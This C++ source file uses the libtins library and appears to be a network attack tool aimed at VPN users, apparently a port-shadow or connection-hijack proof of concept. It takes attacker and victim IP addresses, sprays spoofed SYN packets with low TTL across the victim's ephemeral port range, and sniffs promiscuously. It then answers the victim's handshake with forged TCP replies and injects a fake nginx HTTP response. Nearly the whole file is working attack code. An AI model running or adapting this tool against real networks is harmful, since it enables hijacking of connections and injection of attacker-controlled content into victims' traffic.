#include <tins/tins.h>
#include <cassert>
#include <iostream>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> /* superset of previous */

#include <string>
#include <unistd.h>
#include <thread>
#include <random>
#include <chrono>

using std::thread;
using std::cout;
using std::string;
using std::vector;
using namespace Tins;
bool pshack1 = true;
bool pshack2 = false;


// BEGIN: global variables
string html_response = R"(
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
)";

string iface;
string attacker_pub_ip;
string victim_ip;
// The port for the VPN-stripped TCP-port shadow (reflection)
unsigned short https_port;
bool tcp_continue_ephem = true;
void tcp_fill_ephemeral_port_range() {

#define PORT_RANGE_START 42700 
#define PORT_RANGE_END 52000
	PacketSender sender;
	NetworkInterface iface(iface);

	IP pkt = IP(victim_ip) / TCP(PORT_RANGE_START, https_port);
	IP& ip = pkt.rfind_pdu<IP>();
	TCP& tcp = pkt.rfind_pdu<TCP>();
	tcp.set_flag(TCP::SYN, 1);
	tcp.seq(12345);
	tcp.ack_seq(0);
	while (tcp_continue_ephem) {
		for (unsigned short dport = PORT_RANGE_START;
				dport < PORT_RANGE_END; dport++) {
			ip.ttl(2);
			tcp.dport(dport);
			sender.send(pkt, iface);
		}
		usleep(20000000);
	}
}


int tcp_bind_port(unsigned short tobind) {
	int sockfd;
	struct sockaddr_in servaddr;

	if ( (sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0 ) {
		perror("socket creation failed");
		exit(EXIT_FAILURE);
	}
	memset(&servaddr, 0, sizeof(servaddr));
	
	    // Filling server information
	servaddr.sin_family    = AF_INET; // IPv4
	servaddr.sin_addr.s_addr = INADDR_ANY;
	servaddr.sin_port = htons(tobind);

	    // Bind the socket with the server address
	if ( bind(sockfd, (const struct sockaddr *)&servaddr,
	    sizeof(servaddr)) < 0 )
	{
		perror("bind failed");
		exit(-1);
	}
	std::cout << "sockfd=" << sockfd  << std::endl;
	return sockfd;
}

bool http_sniffer(PDU &some_pdu){
	PacketSender sender;
	NetworkInterface netiface(iface);
	unsigned short vport;
	const IP &ip = some_pdu.rfind_pdu<IP>();

        uint8_t payload[] = {0x48, 0x54, 0x54, 0x50, 0x2f,
		0x31, 0x2e, 0x31, 0x20, 0x32, 0x30, 0x30, 0x20, 0x4f,
		0x4b, 0xd, 0xa, 0x53, 0x65, 0x72, 0x76, 0x65, 0x72,
		0x3a, 0x20, 0x6e, 0x67, 0x69, 0x6e, 0x78, 0x2f, 0x31,
		0x2e, 0x32, 0x31, 0x2e, 0x30, 0xd, 0xa, 0x44, 0x61,
		0x74, 0x65, 0x3a, 0x20, 0x54, 0x68, 0x75, 0x2c, 0x20,
		0x32, 0x34, 0x20, 0x4a, 0x75, 0x6e, 0x20, 0x32, 0x30,
		0x32, 0x31, 0x20, 0x31, 0x33, 0x3a, 0x35, 0x38, 0x3a,
		0x30, 0x31, 0x20, 0x47, 0x4d, 0x54, 0xd, 0xa, 0x43,
		0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2d, 0x54, 0x79,
		0x70, 0x65, 0x3a, 0x20, 0x74, 0x65, 0x78, 0x74, 0x2f,
		0x68, 0x74, 0x6d, 0x6c, 0xd, 0xa, 0x43, 0x6f, 0x6e,
		0x74, 0x65, 0x6e, 0x74, 0x2d, 0x4c, 0x65, 0x6e, 0x67,
		0x74, 0x68, 0x3a, 0x20, 0x36, 0x31, 0x32, 0xd, 0xa,
		0x4c, 0x61, 0x73, 0x74, 0x2d, 0x4d, 0x6f, 0x64, 0x69,
		0x66, 0x69, 0x65, 0x64, 0x3a, 0x20, 0x54, 0x75, 0x65,
		0x2c, 0x20, 0x32, 0x35, 0x20, 0x4d, 0x61, 0x79, 0x20,
		0x32, 0x30, 0x32, 0x31, 0x20, 0x31, 0x32, 0x3a, 0x32,
		0x38, 0x3a, 0x35, 0x36, 0x20, 0x47, 0x4d, 0x54, 0xd,
		0xa, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69,
		0x6f, 0x6e, 0x3a, 0x20, 0x6b, 0x65, 0x65, 0x70, 0x2d,
		0x61, 0x6c, 0x69, 0x76, 0x65, 0xd, 0xa, 0x45, 0x54,
		0x61, 0x67, 0x3a, 0x20, 0x22, 0x36, 0x30, 0x61, 0x63,
		0x65, 0x64, 0x38, 0x38, 0x2d, 0x32, 0x36, 0x34, 0x22,
		0xd, 0xa, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d,
		0x52, 0x61, 0x6e, 0x67, 0x65, 0x73, 0x3a, 0x20, 0x62,
		0x79, 0x74, 0x65, 0x73, 0xd, 0xa, 0xd, 0xa};
	 


	if (ip.src_addr() == victim_ip && ip.protocol() == 6) {
		const TCP& tcp_req = some_pdu.rfind_pdu<TCP>();
		std::cout << "1. src=victim & TCP: flags=" << tcp_req.flags() << std::endl;
		//const RawPDU &raw = some_pdu.rfind_pdu<RawPDU>();
		vport = tcp_req.sport();
		IP pkt = IP(victim_ip) / TCP(vport, 80);
		TCP &tcp = pkt.rfind_pdu<TCP>();
		IP pkt_html1 = IP(victim_ip) / TCP(vport, 80) / RawPDU(payload, sizeof(payload)); 
		IP pkt_html2 = IP(victim_ip) / TCP(vport, 80) / RawPDU(html_response); 
		TCP &tcp_html1 = pkt_html1.rfind_pdu<TCP>();
		TCP &tcp_html2 = pkt_html2.rfind_pdu<TCP>();
		std::cout << "2. src=victim & TCP: flags=" << tcp_req.flags() << std::endl;
		switch(tcp_req.flags()) {
		case 2: // SYN
			std::cout << "TCP.syn: src=" << ip.src_addr() << ":" <<
				tcp_req.sport() << ", dst=" << ip.dst_addr() <<
				":" << tcp_req.dport() << ", flags=" <<
				tcp_req.flags() << std::endl;
			tcp.set_flag(TCP::SYN, 1);
			tcp.set_flag(TCP::ACK, 1);
			tcp.seq(12345);
			tcp.ack_seq(tcp_req.seq() + 1);
			tcp_continue_ephem = false;
			sender.send(pkt, netiface);
			break;
		case 16: // ACK only
			std::cout << "TCP.ack: src=" << ip.src_addr() << ":" <<
				tcp_req.sport() << ", dst=" << ip.dst_addr() <<
				":" << tcp_req.dport() << ", flags=" <<
				tcp_req.flags() << "seq=" << tcp_req.seq() <<
				", ack=" << tcp_req.ack_seq() << std::endl;
			break;
		case 24: 
			/* Received PSH/ACK
			 * Send ACK
			 * Send PSH/ACK {}
			 * i
			 *
			 * */

			if (pshack1) { 
				unsigned int len = 139;
				std::cout << "TCP.pshack1: src=" << ip.src_addr() << ":" <<
					tcp_req.sport() << ", dst=" << ip.dst_addr() <<
					":" << tcp_req.dport() << ", flags=" <<
					tcp_req.flags() << "seq=" << tcp_req.seq() <<
					", ack=" << tcp_req.ack_seq() << 
					", ip.tot_len=" << pkt.tot_len() <<  
					", ip.head_len=" << pkt.head_len() <<
					", tcp.head_len=" << tcp_html2.header_size() <<
					", len=" << len << std::endl;
				
				tcp.set_flag(TCP::ACK, 1);
				tcp.seq(tcp_req.ack_seq());
				tcp.ack_seq(tcp_req.seq() + len); // + raw.header_size());
				
				tcp_html1.set_flag(TCP::PSH, 1);
				tcp_html1.set_flag(TCP::ACK, 1);
				tcp_html1.seq(tcp_req.ack_seq());
				tcp_html1.ack_seq(tcp_req.seq() + len); // + raw.header_size());
				
				tcp_html2.set_flag(TCP::PSH, 1);
				tcp_html2.set_flag(TCP::ACK, 1);
				tcp_html2.seq(tcp_req.ack_seq() + 238); // its either 238 or 239...
				tcp_html2.ack_seq(tcp_req.seq() + len); // + raw.header_size());


				sender.send(pkt, netiface);
				sender.send(pkt_html1, netiface);
				sender.send(pkt_html2, netiface);
				pshack1 = false;
				pshack2 = true;
			} 
			break;
		default: /// XXX: May need to write a fin/ack case too :( 
			break;
		}
	} 
	return true;
}

void http_request_handler() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	// config.set_filter("port 80");
	Sniffer sniffer("any", config);
	sniffer.sniff_loop(http_sniffer);
}

int main(int argc, char** argv) {
	if (argc != 5) {
		cout << "sike wrong number of args ---> (iface, attacker_pub_ip, victim_ip, https_port)\n";
		return 0;
	}
	iface = argv[1];
	attacker_pub_ip = argv[2];

	victim_ip = argv[3]; // victim server IP

	https_port = atoi(argv[4]);

	// Need to bind to this port because the victim will send packets
	// to the tun interface's ip address and the VPN listening port 
	// tcp_bind_port(https_port);
	
        thread tcp_ephemeral_scan_thread(
			tcp_fill_ephemeral_port_range);
	tcp_ephemeral_scan_thread.detach();

	thread sniff_http_request(http_request_handler);
	sniff_http_request.join();

	return 0;
}
